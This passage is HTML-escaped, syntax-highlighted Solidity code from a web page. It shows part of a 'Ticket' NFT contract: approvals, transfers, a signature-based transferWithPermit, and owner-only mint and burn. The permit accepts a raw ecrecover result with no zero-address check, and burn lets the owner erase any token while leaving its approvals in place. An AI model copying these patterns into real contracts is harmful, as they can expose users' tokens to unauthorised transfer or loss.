&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(to &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;ticketOwner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: approval to current owner&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;ticketOwner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isApprovedForAll&lt;&#x2F;span&gt;&lt;span&gt;(ticketOwner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: approve caller is not owner nor approved for all&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        )&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        _tokenApprovals[tokenId] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        emit &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Approval&lt;&#x2F;span&gt;&lt;span&gt;(ticketOwner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;tokenId)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getApproved&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 tokenId&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(_owners[tokenId] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: approved query for nonexistent token&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;_tokenApprovals[tokenId]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setApprovalForAll&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address operator&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool approved&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(operator &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: approve to caller&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        _operatorApprovals[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender][operator] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;approved&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        emit &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ApprovalForAll&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;operator&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;approved)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isApprovedForAll&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address operator&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;_operatorApprovals[_owner][operator]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 tokenId&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_isApprovedOrOwner&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;tokenId)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: transfer caller is not owner nor approved&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_transfer&lt;&#x2F;span&gt;&lt;span&gt;(from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;tokenId)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;safeTransferFrom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 tokenId&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;safeTransferFrom&lt;&#x2F;span&gt;&lt;span&gt;(from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;tokenId&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;safeTransferFrom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 tokenId&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes memory _data&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_isApprovedOrOwner&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;tokenId)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: transfer caller is not owner nor approved&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_safeTransfer&lt;&#x2F;span&gt;&lt;span&gt;(from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;tokenId&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_data)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transferWithPermit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 tokenId&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 deadline&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint8 v&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes32 r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes32 s&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;timestamp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;= &lt;&#x2F;span&gt;&lt;span&gt;deadline&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: permit expired&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        bytes32 digest &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x19\x01&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_getDomainSeparator&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(PERMIT_TYPEHASH&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;tokenId&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;nonces[from]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;deadline))))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        address signer &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ecrecover&lt;&#x2F;span&gt;&lt;span&gt;(digest&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;v&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;s)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(signer &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: invalid permit&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_transfer&lt;&#x2F;span&gt;&lt;span&gt;(from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;tokenId)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address target&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: Only the owner can mint tickets&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        _owners[id] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        id&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;burn&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 tokenId&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: caller is not owner nor approved&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        _owners[tokenId] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;------------------------------------------------ INTERNAL FUNCTIONS ------------------------------------------------&#x2F;&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 tokenId&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;internal &lt;&#x2F;span&gt;&lt;span&gt;{
